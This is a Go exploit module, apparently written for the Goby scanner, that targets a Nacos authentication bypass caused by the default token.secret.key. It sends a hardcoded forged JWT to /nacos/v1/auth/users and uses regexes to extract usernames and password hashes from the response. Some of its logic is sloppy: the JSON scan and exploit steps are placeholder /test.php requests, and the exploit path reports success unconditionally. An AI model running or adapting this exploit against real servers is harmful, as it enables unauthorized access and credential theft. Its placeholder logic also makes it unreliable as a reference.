package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Alibaba Nacos /users Permission Bypass Vulnerability",
    "Description": "<p>Nacos is an easy-to-use platform designed for dynamic service discovery and configuration, as well as service management. It can help you easily build cloud-native applications and microservices.</p><p>Nacos has an identity authentication bypass vulnerability, and the open source service management platform Nacos does not modify the token.secret.key under the default configuration, resulting in remote attackers can bypass key authentication and enter the background, causing the system to be controlled and other consequences.</p>",
    "Product": "NACOS",
    "Homepage": "https://nacos.io/zh-cn/index.html",
    "DisclosureDate": "2021-09-22",
    "PostTime": "2024-09-25",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"Nacos\" || (body=\"Alibaba Group Holding Ltd.\" && body=\"src=\\\"js/main.js\" && body=\"console-fe\") || (banner=\"/nacos/\" && (banner=\"HTTP/1.1 302\" || banner=\"HTTP/1.1 301 Moved Permanently\")) || banner=\"realm=\\\"nacos\"||protocol=\"nacos\"||protocol=\"nacos(http)\"",
    "GobyQuery": "title=\"Nacos\" || (body=\"Alibaba Group Holding Ltd.\" && body=\"src=\\\"js/main.js\" && body=\"console-fe\") || (banner=\"/nacos/\" && (banner=\"HTTP/1.1 302\" || banner=\"HTTP/1.1 301 Moved Permanently\")) || banner=\"realm=\\\"nacos\"||protocol=\"nacos\"||protocol=\"nacos(http)\"",
    "Level": "1",
    "Impact": "<p>Nacos has an identity authentication bypass vulnerability, and the open source service management platform Nacos does not modify the token.secret.key under the default configuration, resulting in remote attackers can bypass key authentication and enter the background, causing the system to be controlled and other consequences.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/alibaba/nacos/issues/7182"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass",
        "2H1W"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.0",
    "Translation": {
        "CN": {
            "Name": "Alibaba Nacos /users 权限绕过漏洞",
            "Product": "NACOS",
            "Description": "<p>Nacos是一个易于使用的平台，专为动态服务发现和配置以及服务管理而设计。可以帮助您轻松构建云原生应用程序和微服务平台。<br></p><p>Nacos 存在身份认证绕过漏洞，开源服务管理平台Nacos在默认配置下未对token.secret.key进行修改，导致远程攻击者可以绕过密钥认证进入后台，造成系统受控等后果。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>Nacos 存在身份认证绕过漏洞，开源服务管理平台Nacos在默认配置下未对token.secret.key进行修改，导致远程攻击者可以绕过密钥认证进入后台，造成系统受控等后果。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Alibaba Nacos /users Permission Bypass Vulnerability",
            "Product": "NACOS",
            "Description": "<p>Nacos is an easy-to-use platform designed for dynamic service discovery and configuration, as well as service management. It can help you easily build cloud-native applications and microservices.</p><p>Nacos has an identity authentication bypass vulnerability, and the open source service management platform Nacos does not modify the token.secret.key under the default configuration, resulting in remote attackers can bypass key authentication and enter the background, causing the system to be controlled and other consequences.</p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Nacos has an identity authentication bypass vulnerability, and the open source service management platform Nacos does not modify the token.secret.key under the default configuration, resulting in remote attackers can bypass key authentication and enter the background, causing the system to be controlled and other consequences.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9956"
}`

	sendPayloadasujifhyuasdfyghaustgfuaskyhdfasjilfgtvbcyisdf := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：msg是返回的数据
		// 注意：vulInfo是请求路径
		vulInfo := `/nacos/v1/auth/users`
		msg := ``
		requestConfig := httpclient.NewGetRequestConfig("/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTk5MDAwMDAwMH0.laPeHg6PvCeQkogzt6rKdR0tCHwvCM9SOgySpyQ7NWU&pageNo=1&pageSize=9&search=accurate")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "\"username\"") && strings.Contains(resp.RawBody, "\"password\"") {
				msg = resp.RawBody
				//正则匹配
				re, _ := regexp.Compile(`"username":"((.|\n)*?)"`)
				//检查是否有匹配到内容
				if !re.MatchString(resp.RawBody) {
					return true, vulInfo, msg
				}
				match := re.FindStringSubmatch(resp.RawBody)
				commandResult := "username: " + match[1] + "\r\n"
				re, _ = regexp.Compile(`"password":"((.|\n)*?)"`)
				//检查是否有匹配到内容
				if !re.MatchString(resp.RawBody) {
					return true, vulInfo, msg
				}
				match = re.FindStringSubmatch(resp.RawBody)
				commandResult += "password: " + match[1]
				msg = commandResult
				return true, vulInfo, msg
			}
		}
		return false, vulInfo, msg
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, vulInfo, _ := sendPayloadasujifhyuasdfyghaustgfuaskyhdfasjilfgtvbcyisdf(hostInfo)
			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.HostInfo + vulInfo
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, _, vulPath := sendPayloadasujifhyuasdfyghaustgfuaskyhdfasjilfgtvbcyisdf(expResult.HostInfo)
			expResult.Output = vulPath
			expResult.Success = true
			return expResult
		},
	))
}
